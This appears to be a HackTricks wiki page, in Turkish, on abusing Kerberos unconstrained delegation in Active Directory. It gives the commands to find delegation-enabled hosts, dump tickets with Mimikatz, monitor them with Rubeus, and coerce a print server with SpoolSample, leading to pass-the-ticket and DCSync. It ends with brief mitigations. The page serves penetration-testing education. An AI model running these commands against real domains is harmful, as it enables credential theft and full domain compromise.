# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Bu, bir Alan Yöneticisinin alan içindeki herhangi bir **Bilgisayar** için ayarlayabileceği bir özelliktir. Daha sonra, bir **kullanıcı Bilgisayara giriş yaptığında**, o kullanıcının **TGT'sinin bir kopyası** DC tarafından sağlanan **TGS'ye gönderilecek** ve **LSASS'ta bellekte saklanacaktır**. Yani, makinede Yönetici ayrıcalıklarınız varsa, **biletleri dökebilir ve kullanıcıları taklit edebilirsiniz**.

Bu nedenle, "Unconstrained Delegation" özelliği etkinleştirilmiş bir Bilgisayara giriş yapan bir alan yöneticisi varsa ve o makinede yerel yönetici ayrıcalıklarınız varsa, bileti dökebilir ve Alan Yöneticisini her yerde taklit edebilirsiniz (alan privesc).

Bu **özelliğe sahip Bilgisayar nesnelerini bulabilirsiniz**; [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) niteliğinin [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) içerip içermediğini kontrol ederek. Bunu ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filtresi ile yapabilirsiniz; bu, powerview'ün yaptığıdır:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DC'ler her zaman görünür ama privesc için faydalı değildir
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Tavsiye edilen yol
kerberos::list /export #Başka bir yol

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Yeni TGT'ler için her 10 saniyede bir kontrol et</code></pre>

Yönetici (veya kurban kullanıcının) biletini bellekte **Mimikatz** veya **Rubeus ile** yükleyin [**Pass the Ticket**](pass-the-ticket.md)** için.**\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Unconstrained delegation hakkında daha fazla bilgi ired.team'de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Eğer bir saldırgan "Unconstrained Delegation" için izin verilen bir bilgisayarı **ele geçirebilirse**, bir **Yazıcı sunucusunu** **otomatik olarak giriş yapmaya** **kandırabilir** ve bu da sunucunun belleğinde bir TGT **kaydedebilir**.\
Daha sonra, saldırgan **Yazıcı sunucu bilgisayar hesabını taklit etmek için Pass the Ticket saldırısı** gerçekleştirebilir.

Bir yazıcı sunucusunu herhangi bir makineye giriş yapması için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Eğer TGT bir etki alanı denetleyicisinden geliyorsa, bir [**DCSync attack**](acl-persistence-abuse/#dcsync) gerçekleştirebilir ve DC'den tüm hash'leri elde edebilirsiniz.\
[**Bu saldırı hakkında daha fazla bilgi ired.team'de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Kimlik doğrulamayı zorlamak için diğer yollar:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigasyon

- DA/Admin oturum açmalarını belirli hizmetlerle sınırlayın
- Ayrıcalıklı hesaplar için "Hesap hassastır ve devredilemez" ayarını yapın.

{{#include ../../banners/hacktricks-training.md}}
